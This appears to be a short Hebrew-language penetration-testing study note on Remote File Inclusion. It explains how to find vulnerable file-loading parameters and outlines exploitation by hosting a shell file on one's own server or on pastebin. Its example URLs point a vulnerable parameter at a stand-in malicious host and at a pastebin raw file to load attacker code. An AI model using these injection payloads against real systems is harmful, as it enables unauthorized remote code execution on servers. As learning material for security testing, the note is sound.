RFI - Remote File Inclusion
# המטרה
* לטעון קבצים מרוחקים - אבל זה לא מספיק
* הרצת קוד מרחוק בעקבות קובץ שהעלנו - [[RCE]]
# אינדיקציה
* אם יש קלט בURL שטוען קובץ כלשהו - אם השיטה GET
```
https://pentest.vaadata.com/index.php?page=home
```
* אם יש קלט בגוף הבקשה שטוען משהו - אם הבקשה בPOST
* אם זיהיתי [[LFI]] אז אני אנסה - לטעון קובץ מרוחק
* אם יש קלט בURL שטוען כתובת מרוחקת
```
victim.php?module_name=http://malicious.example.com
```

# ניצול
1) איתור אזור פגיע
2) יצירת קובץ זדוני שנחדיר בנקודת ההזרקה
3) ביצוע ההזרקה
4) הרצת פקודה
### אופציה 1 - שרת משלנו
1. הרמת שרת משלנו בקאלי לינוקס או במחשב הרגיל שלנו
2. יצירת קובץ shell כלשהו
3. טעינת הכתובת של המכונה שלנו
4. ביצוע פקודה כלשהי או אינדיקציה להעלאה כלשהי למערכת הנתקפת

### אופציה 2 - שימוש בpastebin
האתר: https://pastebin.com/
* הוא נותן לנו ליצור קובץ למשל php ואז לטעון אותו מבלי להרים שרת
* ניצור את הpaste
<img width="969" height="250" alt="Pasted image 20250723003202" src="https://github.com/user-attachments/assets/672b2598-d3a8-4fe6-a530-56c79c91230d" />

* ניקח את הכתובת שנוצרה כמו בתמונה
<img width="1334" height="135" alt="Pasted image 20250723003223" src="https://github.com/user-attachments/assets/ae176f0d-6065-4fbc-a5c3-47855c4828ad" />

* ננסה לטעון אותה על הקלט הפגיע
```
http://victim.php?module_name=http://pastebin.com/raw/serqJC55
```
